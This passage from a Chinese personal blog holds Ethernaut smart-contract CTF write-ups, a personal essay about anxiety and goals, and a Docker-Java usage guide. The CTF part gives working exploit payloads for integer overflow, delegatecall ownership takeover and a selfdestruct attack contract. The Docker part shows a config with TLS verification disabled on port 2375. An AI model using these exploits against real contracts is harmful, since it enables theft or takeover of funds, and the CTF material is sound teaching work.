<li>在 0.8.0 以前的版本（这里是 0.7.5）有这样的描述：“加法，减法和乘法具有通常的语义，值用两进制补码表示，意思是比如：<code>uint256（0） - uint256（1）== 2 ** 256 - 1</code> 。 我们在设计和编写智能合约时必须考虑到溢出问题。”</li>
</ol>
<p>题目环境为 <code>0.6.0</code> ，溢出问题存在，要搞大数字直接溢出即可；</p>
<h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p><strong>payload</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">transfer</span>(instance,<span class="number">21</span>)</span><br></pre></td></tr></table></figure>

<h2 id="ethernaut-Delegation"><a href="#ethernaut-Delegation" class="headerlink" title="ethernaut - Delegation"></a>ethernaut - Delegation</h2><p><strong>description</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// The goal of this level is for you to claim ownership of the instance you are given.</span><br><span class="line"></span><br><span class="line">  // Things that might help</span><br><span class="line"></span><br><span class="line">// Look into Solidity&#x27;s documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.</span><br><span class="line">// Fallback methods</span><br><span class="line">// Method ids</span><br></pre></td></tr></table></figure>

<p><strong>source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor(address _owner) &#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    Delegate delegate;</span><br><span class="line"></span><br><span class="line">    constructor(address _delegateAddress) &#123;</span><br><span class="line">        delegate = Delegate(_delegateAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">        if (result) &#123;</span><br><span class="line">            this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部署的是<code>Delegation</code>，其回调函数的作用是进行一次<code>delegatecall</code>， 在<code>Delegate</code>中调用目标函数；</p>
<p>直接尝试调用<code>pwn()</code>即可；</p>
<p>而且这里涉及到<code>delegatecall</code>的特点，不改变交易属性，也就是<code>msg.sender</code>仍然是<code>player</code>自己；</p>
<p>发起一个交易，将签名<code>data</code>改为<code>pwn()</code>的<code>keccak256</code>值的前四字节；</p>
<p>傻逼 js <code>slice</code>的时候把<code>sha3</code>的结果看作字符串，因此取前四字节要取前十位，因为有<code>&quot;0x&quot;</code>；</p>
<h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">data</span>:web3.<span class="property">utils</span>.<span class="title function_">sha3</span>(<span class="string">&quot;pwn()&quot;</span>).<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">10</span>)&#125;);</span><br></pre></td></tr></table></figure>

<p>注：solidity 的<code>keccak256</code>就是<code>sha3</code>；</p>
<h2 id="ethernaut-Force"><a href="#ethernaut-Force" class="headerlink" title="ethernaut - Force"></a>ethernaut - Force</h2><p><strong>description</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// Some contracts will simply not take your money ¯\_(ツ)_/¯</span><br><span class="line"></span><br><span class="line">// The goal of this level is to make the balance of the contract greater than zero.</span><br><span class="line"></span><br><span class="line">  // Things that might help:</span><br><span class="line"></span><br><span class="line">// Fallback methods</span><br><span class="line">// Sometimes the best way to attack a contract is with another contract.</span><br><span class="line">// See the &quot;?&quot; page above, section &quot;Beyond the console&quot;</span><br></pre></td></tr></table></figure>

<p><strong>source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123; /*</span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">    /~____  =ø= /</span><br><span class="line">    (______)__m_m)</span><br><span class="line">                   */ &#125;</span><br></pre></td></tr></table></figure>

<p>给空合约发钱的问题，没有<code>receive()</code>也没有<code>callback()</code>；</p>
<p>查阅官方文档：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 一个没有receive函数的合约，可以作为 coinbase 交易 （又名 矿工区块回报 ）的接收者或者作为 selfdestruct 的目标来接收以太币。</span><br></pre></td></tr></table></figure>

<p>结合提示，尝试构建一个有<code>receive()</code>和<code>selfdestruct()</code>的合约，然后销毁之。</p>
<h3 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h3><p><strong>exp source (GPT)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address payable target;</span><br><span class="line"></span><br><span class="line">    // 在部署时设置目标合约的地址</span><br><span class="line">    constructor(address payable _target) &#123;</span><br><span class="line">        target = _target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 允许该合约接收以太币</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // 自毁合约并发送所有以太币到目标合约</span><br><span class="line">    function destroy() external payable &#123;</span><br><span class="line">        selfdestruct(target);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部署之后向目标合约转账；</p>
<p>然后调用<code>destroy()</code>，<code>getBalance()</code>后发现<code>instant</code>已经有余额；</p>
<p>通！</p>
<h2 id="你好"><a href="#你好" class="headerlink" title="你好"></a>你好</h2><p>好你；</p>
<p>想起来小学有个大胖子，别人招惹他之后，他的口头禅是：</p>
<p>”好你个……“</p>
<p>小秦加油努力！</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2024/04/02/2024-04-02-%E6%97%A2%E5%AE%9A%E7%9A%84%E6%9C%AA%E6%9D%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QST137">
      <meta itemprop="description" content="苍山岁岁有人去，唯愿洱海生白波。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QST2's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/04/02/2024-04-02-%E6%97%A2%E5%AE%9A%E7%9A%84%E6%9C%AA%E6%9D%A5/" class="post-title-link" itemprop="url">既定的未来</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-04-02 00:00:00" itemprop="dateCreated datePublished" datetime="2024-04-02T00:00:00+08:00">2024-04-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-09-15 04:12:11" itemprop="dateModified" datetime="2024-09-15T04:12:11+08:00">2024-09-15</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/misc/" itemprop="url" rel="index"><span itemprop="name">misc</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="既定的未来"><a href="#既定的未来" class="headerlink" title="既定的未来"></a>既定的未来</h1><p>凌晨陷入了恐怖的焦虑之中。大概来源于自己前一年半什么也没做，不知道自己兴趣在何处，不知道该干什么。</p>
<p>大一上学期想保清北信工所深埋绩点之中，大一下学期疫情解封想多谈恋爱及时行乐毕业去二线城市躺平，大二上学期又阴差阳错地在<em><strong>太子港</strong></em>一个假期的 push 之下进了天璇，如此搭上了视野扩展的第一架桥。然而我是一个瞻前顾后的人，我不知道自己 CTF 能打多久，能打到什么程度，望着又不自信自己的智商，在新生赛证明了自己的智商，入围后却不知道学什么，繁乱的 WEB 技能树甚至不如实验班课程给我的吸引力大。弱智 Spring boot 学得我忘乎所以，项目的弱智后端做完了又去刷抖音，刷 b 站，打英雄联盟，转眼间一学期的时光就浪费掉了。我都不知道这到底是在奖励自己还是惩罚自己。</p>
<p>到了这个寒假，在学长 push 之下帮忙写了点 wiki ，跟着看了两个 CTF ，几乎什么都不会，对题目的贡献无限趋近于0。我原谅了自己。颉夏青找我做一个看起来很牛逼的项目，于是我又搞上三四年前就废弃的机器学习了。学着包装 PPT ，给团队成员打鸡血，调试模型。我又觉得自己做事情了，于是又不学了。</p>
<p>我会在沈阳和我的兄弟们随便找一个包间一打打一天麻将，赴约一场又一场，去体验二十多年的台球厅，和女兄弟、女兄弟的男闺蜜、男闺蜜的男 gay 蜜喝酒唱 K ，我会装醉跟女士拥抱，会装傻差点被女士拽到汉庭酒店，我在这些时间和空间肆意妄为，哈哈大笑，觉得这就是我的人生了——这人生好快乐——可这不是我的人生。</p>
<p>从我记事儿以来我就没觉得我该这样过，我的理想一向是在某一个行当有所成就，这一般伴随着赚很多（对于我的认知来说很多）的钱。我只是累了，累得出奇。我不知道未来要做什么，不知道要学什么，不知道我会爱上什么样的人。恰恰我又读了自主性最强的 IT ，于是乎我只能为所有未来的可能性努力，什么都学，尝试接触身边所有可能爱上的人。人，至少我是不能这么用的。我超负荷了，什么也做不了了。</p>
<p>不想谈 MBTI ，但我很早就是 sj 人了。这样的生活对 sj 人来说太绝望了。</p>
<p>我一向是用心的眼睛盯着旁人才嗯那个有所前进，所幸我在滑落谷底的边缘遇到了三位目标明确行动坚定的人，三位在我的标准里可以托付至少半颗心的人。</p>
<p>首先是大我两届的<em><strong>谷</strong></em>。此人一度给我一种非常神秘威严的感觉。直到上个假期我向他倾诉了一次，那过后我心里神秘威严的印象并未消解，但我觉得这个人是值得交付心情的，也是乐于收揽心情的。无论是方向上还是情绪上，都可以称之为我的直系学长。在我接触到下一个合适的人之前很长一段时间内，我需要间歇让他做我的引路人。我打心底里是崇拜他的，故他随便的一句认可或者建议都能消解我无数的云雾。</p>
<p>二是我的好友<em><strong>古</strong></em>。此人和我一样傻逼。近日突然开始专注学一样东西，是我沙河图书馆的官方指定唯一搭子。好朋友间不至于对标，至少我看着同伴在努力，自己也没了摆烂的理由。</p>
<p>三是<em><strong>忘</strong></em>。追她这件事让我第一次感受到从泛泛想象到清晰目标的转变给我带来的快感。更惊喜的是，她是一个未来规划很明确的人，还是一个努力的人。最重要的一点，我非常喜欢她，喜欢她身上的所有性格特质。我很幸运地被她喜欢了，她带给了我一场世界上最好的恋爱。这一场恋爱收束了我的心绪，我的心里有了未来的样子。很长一段时间内，我要围绕一件事情奋斗，我决定我要成功了。</p>
<p><strong>我定好了学某个方向，进某个组，拿着这个组的丰厚经验胜利就业。</strong></p>
<p>这是我最喜欢的节奏，它让我想到四五年前意气风发无所不能的我。那时候我的心里只有高考一件事，每天都在想着如何考进北师大的数学系，当时的方法也非常简单，多做题就行；至于现在如何去学，我要不断地问，没什么信息差，无外乎不停的努力。</p>
<p>如今实验班退不掉了，我也欣然接受。同时我不再怀疑自己的智商。东隅已逝，桑榆非晚；我如今赤条条地面对这个世界，宣告一个巨大的阳谋，而不怕世界说我如何如何吹牛逼。</p>
<p>未来无限可能，但是我马上二十岁了，应该选择一种去实现了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2023/11/01/2023-11-01-Docker-Java%20%E4%BD%BF%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QST137">
      <meta itemprop="description" content="苍山岁岁有人去，唯愿洱海生白波。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QST2's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/01/2023-11-01-Docker-Java%20%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">Docker-Java 使用小记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-11-01 00:00:00" itemprop="dateCreated datePublished" datetime="2023-11-01T00:00:00+08:00">2023-11-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-09-19 21:15:18" itemprop="dateModified" datetime="2024-09-19T21:15:18+08:00">2024-09-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/development/" itemprop="url" rel="index"><span itemprop="name">development</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Docker-Java-使用小记"><a href="#Docker-Java-使用小记" class="headerlink" title="Docker-Java 使用小记"></a>Docker-Java 使用小记</h1><ul>
<li>前置知识<ul>
<li>Java 语言</li>
<li>Springboot 框架</li>
<li>docker 基础知识</li>
<li>dockerfile 的使用</li>
</ul>
</li>
</ul>
<p>作者在最近项目中用 docker-java 动态部署 docker 。总结了一些经验。</p>
<h2 id="0x01-依赖项"><a href="#0x01-依赖项" class="headerlink" title="0x01 依赖项"></a>0x01 依赖项</h2><h3 id="0x01x01-Maven"><a href="#0x01x01-Maven" class="headerlink" title="0x01x01 Maven"></a>0x01x01 Maven</h3><p>正常使用就两个依赖项，官方文档有写。</p>
<p>版本号以 maven 官方仓库的最新版本为准。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.github.docker-java/docker-java --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.docker-java<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>docker-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.github.docker-java/docker-java-transport-httpclient5 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.docker-java<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>docker-java-transport-httpclient5<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x01x02-java-lang-NoClassDefFoundError"><a href="#0x01x02-java-lang-NoClassDefFoundError" class="headerlink" title="0x01x02 java.lang.NoClassDefFoundError"></a>0x01x02 java.lang.NoClassDefFoundError</h3><p>Maven 配置不当 &#x2F; 抽风的情况下， 偶尔 docker-java 本身的依赖不会自动加载进来。导致调用后续使用中马上会报错。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java.lang.NoClassDefFoundError</span><br><span class="line">java.lang.ClassNotfoundException</span><br></pre></td></tr></table></figure>

<p>这两者有一定区别，不过这里是同时报出来的。看堆栈的话 NoClassDefFoundError 在先。</p>
<p>自行查看报错堆栈，导入没有的包即可。</p>
<p>作者当时是少了这个：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.httpcomponents.core5<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>httpcore5-h2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>比较坑，因为 httpcore5 是存在的，这里报找不到类导致作者一直在乱找问题，翻了好久才发现其下没有 http2 的类，要导入 httpcore-h2 才好。</p>
<h2 id="0x02-初始化"><a href="#0x02-初始化" class="headerlink" title="0x02 初始化"></a>0x02 初始化</h2><p>首先要连接到本地的 docker 服务上。</p>
<h3 id="0x02x01-docker-java-properties"><a href="#0x02x01-docker-java-properties" class="headerlink" title="0x02x01 docker-java.properties"></a>0x02x01 docker-java.properties</h3><p>Docker-java 官方文档中介绍了多种方式修改 docker 的默认属性。</p>
<p>使用配置文件方式的示例：</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -docker version 查看 API version</span></span><br><span class="line"><span class="attr">api.version</span>=<span class="string">1.43</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># 2375 端口，不可暴露。</span></span><br><span class="line"><span class="attr">DOCKER_HOST</span>=<span class="string">tcp://localhost:2375</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># 2376 端口，支持开启 TLS</span></span><br><span class="line"><span class="comment">#DOCKER_HOST=tcp://localhost:2376</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># 关闭tls</span></span><br><span class="line"><span class="attr">DOCKER_TLS_VERIFY</span>=<span class="string">0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># TLS 证书</span></span><br><span class="line"><span class="comment">#DOCKER_CERT_PATH=/home/user/.docker/certs</span></span><br><span class="line"><span class="comment">#DOCKER_CONFIG=/home/user/.docker</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># 私有 registry 搭建，镜像不是很多可以不用</span></span><br><span class="line"><span class="comment">#registry.url=http://url:5000/v2/</span></span><br><span class="line"><span class="comment">#registry.username=QST</span></span><br><span class="line"><span class="comment">#registry.password=QinShutian</span></span><br><span class="line"><span class="comment">#registry.email=qst@ckw.com</span></span><br></pre></td></tr></table></figure>

<p>项目上线时 tls 这部分可能很重要， docker 服务本身没有身份验证机制，公网上 2375 端口暴露会使黑客甚至任何人都能够恶意操作 docker 。</p>
<p>故而如果不可避免地要暴露 docker 服务，不能使用 2375 端口。</p>
<p>目前作者的项目体量小，服务全在本地，封闭 2375 不让外界访问即可，故此处不展开。</p>
<h3 id="0x02x02-设置-DockerClient"><a href="#0x02x02-设置-DockerClient" class="headerlink" title="0x02x02 设置 DockerClient"></a>0x02x02 设置 DockerClient</h3><p>基本使用官方文档中的示例即可。</p>
<p>如果使用 docker-java.properties ， createDefaultConfigBuilder() 创建的默认 config 中，属性即为你配置文件中所写的属性。如果代码中需要改动，也可以在 build 前使用 with 方法注入。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DockerClientConfig</span> <span class="variable">config</span> <span class="operator">=</span> DefaultDockerClientConfig.createDefaultConfigBuilder().build();</span><br><span class="line"><span class="type">DockerHttpClient</span> <span class="variable">httpClient</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ApacheDockerHttpClient</span>.Builder()</span><br><span class="line">                .dockerHost(config.getDockerHost())</span><br><span class="line">                .sslConfig(config.getSSLConfig())</span><br><span class="line">                .maxConnections(<span class="number">100</span>)</span><br><span class="line">                .connectionTimeout(Duration.ofSeconds(<span class="number">30</span>))</span><br><span class="line">                .responseTimeout(Duration.ofSeconds(<span class="number">45</span>))</span><br><span class="line">                .build();</span><br><span class="line"><span class="type">DockerClient</span> <span class="variable">dockerClient</span> <span class="operator">=</span> DockerClientImpl.getInstance(config, httpClient);</span><br></pre></td></tr></table></figure>

<p>DockerClient 创建完成后，接下来就可以相对优雅地调用 dockerAPI 了。</p>
<h2 id="0x03-操作-docker-（基于-dockerfile-）"><a href="#0x03-操作-docker-（基于-dockerfile-）" class="headerlink" title="0x03 操作 docker （基于 dockerfile ）"></a>0x03 操作 docker （基于 dockerfile ）</h2><p>docker-java 提供的方法其实非常全面，基本建立了 dockerClient 就能涵盖对 docker 服务的所有操作。这里拣最基本最重要的介绍一下。</p>
<p>作者主要用到的是自定义镜像和容器管理，未涉及镜像仓库管理（ pull&amp;push ）。</p>
<h3 id="0x03x01-dockerClient-用法"><a href="#0x03x01-dockerClient-用法" class="headerlink" title="0x03x01 dockerClient 用法"></a>0x03x01 dockerClient 用法</h3><p>dockerClient 中方法的使用基本都一致。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">XxxxxxCmd</span> <span class="variable">cmd</span> <span class="operator">=</span> dockerClient.xxxxxxCmd().withxxx().withxxx(); <span class="comment">// 创建命令</span></span><br><span class="line">cmd.exec()                                                    <span class="comment">// 执行命令（同步）</span></span><br></pre></td></tr></table></figure>

<p>.exec() 方法这里分为同步的和异步的。</p>
<p>开发者大概是考虑到部分 docker 操作工程量比较大，耗时长，故把这些操作的原型统一为异步抽象类。与同步操作的区别就是这里异步操作的 .exec() 方法需要指定回调。</p>
<p>翻了一下源码，异步操作比较少，但有几个还是很常用的。</p>
<p>![23-10-21-Docker-Java 使用 1](.._pics\23-10-21-Docker-Java 使用 1.png)</p>
<p>异步操作的 .exec() 方法是有参的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.exec(callback)</span><br></pre></td></tr></table></figure>

<p>故而要先实例化一个对应的 callback 对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">XxxxxxCallback</span> <span class="variable">callback</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XxxxxxCallback</span>();</span><br></pre></td></tr></table></figure>

<p>也可以重写函数体输出一些调试信息之类的，当然正常使用也行。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">XxxxxxResultCallback</span> <span class="variable">callback</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XxxxxxResultCallback</span>()&#123;</span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onNext</span><span class="params">(XxxxResponseItem item)</span> &#123;</span><br><span class="line">			<span class="comment">// your action</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="0x03x02-创建镜像"><a href="#0x03x02-创建镜像" class="headerlink" title="0x03x02 创建镜像"></a>0x03x02 创建镜像</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String imageName; <span class="comment">// 镜像名</span></span><br><span class="line">String dockerfilePath; <span class="comment">// dockerfile 路径</span></span><br><span class="line"><span class="type">File</span> <span class="variable">dockerfile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dockerfilePath); <span class="comment">//dockerfile 对象</span></span><br><span class="line">String containerName; <span class="comment">// 容器名</span></span><br></pre></td></tr></table></figure>

<p>docker-java 没有直接调用 docker run 的接口 ，这是因为 run 本质上就是 build + create 两步操作依次进行。故而这里首先介绍一下 build 。</p>
<p>示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BuildImageResultCallback callback=<span class="keyword">new</span> <span class="title class_">BuildImageResultCallback</span>(); <span class="comment">// 创建 buildImage 的回调</span></span><br><span class="line"><span class="comment">// 创建镜像</span></span><br><span class="line">dockerClient.buildImageCmd(dockerfile).withTag(<span class="string">&quot;local/&quot;</span> + imageName).exec(callback).awaitImageId(); <span class="comment">// await阻塞，等待异步线程执行完（相当于）</span></span><br><span class="line">log.info(<span class="string">&quot;Image built. =&gt; &quot;</span> + dockerClient.listImagesCmd().exec().get(<span class="number">0</span>));</span><br></pre></td></tr></table></figure>

<p>这里 withTag(String tag) 会报过时，代码建议是换用withTags(Set&lt;String&gt; tags)  （因为 docker 一个镜像可以打很多 tag ）。想用就用，影响不大。</p>
